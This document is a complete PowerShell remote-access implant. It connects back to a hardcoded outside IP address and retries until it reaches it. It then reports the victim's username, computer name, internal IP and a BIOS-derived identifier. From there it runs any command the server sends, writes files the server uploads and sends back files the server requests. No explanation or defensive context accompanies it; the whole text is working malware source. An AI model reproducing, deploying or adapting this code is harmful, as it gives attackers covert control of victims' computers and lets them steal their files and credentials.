$address = "34.85.93.181"
$port = "80"


$biosSerialNumber = (Get-WmiObject -ComputerName localhost -Class Win32_BIOS).SerialNumber
$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
$utf8 = New-Object -TypeName System.Text.UTF8Encoding
$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($biosSerialNumber))).replace('-','').ToLower()


Function CheckConnect(){
    $flag = $hash.substring(26, 6) + "-" + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port
    $resultDict=@{type="check";flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}
    $resultData = $resultDict | ConvertTo-Json -Compress
    $writer.WriteLine($resultData)
    $writer.Flush()
}

while ($true) {
    do {
        try {
            Write-Host "Trying to reach "$address":"$port
            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream) 
            break
        }
        catch {
            Start-Sleep -s 1
        }
    } while ($true)

    Write-Host "Connected"


  do {
    try {
      $instruct = $reader.ReadLine() 
      if([String]::IsNullOrEmpty($instruct)){
        $client.Close()
        break
      }
    } catch {
        try {
          Write-Host "Trying2 to reach "$address":"$port
          $client = New-Object System.Net.Sockets.TcpClient($address, $port)
          $stream = $client.GetStream()
          $writer = New-Object System.IO.StreamWriter($stream)
          $reader = New-Object System.IO.StreamReader($stream)
          CheckConnect
          Continue
        }
        catch {
          Write-Host "Reconnecting to the server....." -Foreground "Red";
        }
    }
    $instruct_dict = $instruct | ConvertFrom-Json
    $instruct_type = $instruct_dict.type
    switch ($instruct_type) {
      "shell" {
        $cmd = $instruct_dict.cmd
        try {
            $output = (Invoke-Expression $cmd) 2>&1 | Out-String
        }
        catch  {
            $output = $Error[0] | Out-String
        }
        $resultDict=@{ type = "shell";output=$output;verify=$instruct_dict.verify}
        $resultData = $resultDict | ConvertTo-Json -Compress
        $writer.WriteLine($resultData)
        $writer.Flush()
      }
      "upload" {
        $file_data = $instruct_dict.fileData
        $upload_path= $instruct_dict.uploadPath

        $file_data_block = $file_data.Split(" ")

        $file_bytes = New-Object Byte[] $file_data_block.Count
        for ([int] $i = 0; $i -lt $file_data_block.Count; $i++) {
            $file_bytes[$i] = $file_data_block[$i]
        }
        [System.IO.File]::WriteAllBytes($upload_path, $file_bytes)

        $upload_file = [System.IO.File]::ReadAllBytes($upload_path)

        $resultDict=@{ type = "upload";fileBytesLenght=$upload_file.Length;verify=$instruct_dict.verify}
        $resultData = $resultDict | ConvertTo-Json -Compress

        $writer.WriteLine($resultData)

        try { $writer.Flush() }catch { exit } 
      }

      "download" {
        $file_path = $instruct_dict.filePath
        $file_binary_content = [System.IO.File]::ReadAllBytes($file_path)
        $file_string_content = [string]$file_binary_content
        $resultDict=@{ type = "download";fileContent=$file_string_content;fileBytesLength=$file_binary_content.Length}
        $resultData = $resultDict | ConvertTo-Json -Compress
        $writer.WriteLine($resultData)
        try { $writer.Flush() }catch { exit }
      }
      "info" {
         try{
            $tempSocket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram,0)
            $tempSocket.Connect("8.8.8.8", 65530)
            $internalIP = ([System.Net.IPEndPoint] $tempSocket.LocalEndPoint).Address.ToString()
            $tempSocket.Dispose()

            $flag = $hash.substring(26, 6) + "-" + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port
            $resultDict=@{type="info";internalIP=$internalIP;flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}
            $resultData = $resultDict | ConvertTo-Json -Compress 
            $writer.WriteLine($resultData)
            $writer.Flush()
         }catch{
            break
         }
      }
      "check" {
         try{
             #Get-Random 1000
             #Start-Sleep –m $i
            CheckConnect
            $writer.Flush()
         }catch{
            break
         }
      }
      "close" {
        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
        exit
      }
      Default {
        Continue
      }
    }
  } while ($true)
}
